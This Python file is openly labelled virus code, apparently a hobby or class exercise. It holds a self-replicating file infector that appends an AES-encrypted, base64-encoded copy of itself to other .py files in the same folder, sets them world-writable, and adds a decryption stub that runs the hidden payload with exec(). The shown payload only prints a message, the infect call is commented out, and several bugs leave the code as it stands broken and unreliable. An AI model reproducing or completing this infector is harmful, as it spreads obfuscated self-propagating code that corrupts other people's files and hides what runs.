#I am here to test

import __main__
import base64
import sys
from Crypto import Random
from Crypto.Cipher import AES
import io

##starts virus code from here
def is_infected(filename):
    f = open(filename, 'r')
    lines = f.readlines()
    return lines[len(lines - 1)].startswith("# ####### Magic Works Done by Shashadhar Das!")


def copy_code(filename):
    os.rename(filename, filename + '-copy')
    destination = open(filename, 'w')
    os.chmod(filename, 0o777)
    source = open(filename + '-copy', 'r')
    this = open(__main__.__file__, 'r')

    # Append the original file
    for line in source:
        destination.write(line)

    destination.write("\n# ### Decryption Layer Starts\n")
    destination.write("# coding=utf-8\n")
    destination.write("# Start Unencrypted\n")

    copy = False
    result = ''
    for line in this:
        if line.strip() == '# Start Unencrypted':
            copy = True
        elif line.strip() == '# End Unencrypted':
            destination.write('# End Unencrypted')
            copy = False
        elif copy:
            destination.write(line)

    destination.write("\n# Start payload\n")
    destination.write("#")
    destination.write(str(encrypt(e, filename)))
    destination.write("\n# End payload")
    destination.write("\n# ####### Magic Works Done by Shashadhar Das!")

    os.remove(filename + '-copy')
    source.close()
    destination.close()
    this.close()


# Gets the target
def select_target():
    targetFileName = ''
    path = '.'
    dirs = os.listdir(path)

    # For each file try to infect it
    for filename in dirs:
        if filename.endswith('.py') and (not is_infected(filename)):
            print("Infected " + str(filename))
            return filename
    return targetFileName


def infect():
    targetFilename = select_target();
    if len(targetFilename):
        copy_code(targetFilename)
    else:
        payload()


def encrypt(data, filename):
   source = open(filename + '-copy', 'r')
   key = source.read(16).encode()[:16]
   iv = Random.new().read(AES.block_size)

   # Create the cipher object and encrypt the data
   cipher_encrypt = AES.new(key, AES.MODE_CFB, iv)
   ciphered_bytes = cipher_encrypt.encrypt(data)

   # iv = cipher_encrypt.iv
   ciphered_data = iv + ciphered_bytes
   basecoded = base64.b64encode(ciphered_data)
   valueToDecrupt = str(basecoded, 'utf-8')
   return valueToDecrupt


def payload():
    print("We Are Enjoying Computer Security!")

##ends virus code from here

this = open(__main__.__file__, 'r')
copy = False
result = ''
for line in this:
   if line.strip() == '##starts virus code from here':
      copy = True
   elif line.strip() == '#ends virus code from here':
      copy = False
   elif copy:
      result= result + line

encrypt(result,"test")


#infect()

# ### Decryption Layer Starts

# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import io
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.read(16).encode()[:16]
   iv = Random.new().read(AES.block_size)
   data = data.encode('utf-8')[1:]

   # base 64 decode
   data = base64.b64decode(data)
   cipher_decrypt = AES.new(key, AES.MODE_CFB, iv=iv)

   deciphered_bytes = cipher_decrypt.decrypt(data)

   # Convert the bytes object back to the string
   decrypted_data = deciphered_bytes[16:].decode('utf-8')
   this.close()
   return decrypted_data




# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
    if line.strip() == '# Start payload':
        copy = True
    elif line.strip() == '# End payload':
        copy = False
    elif copy:
        cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
# print e
exec(e)
sys.exit('We are done!')
# End Unencrypted
# Start payload
#Encrypted payload here
# End payload
# ####### Magic Works Done by Shashadhar Das!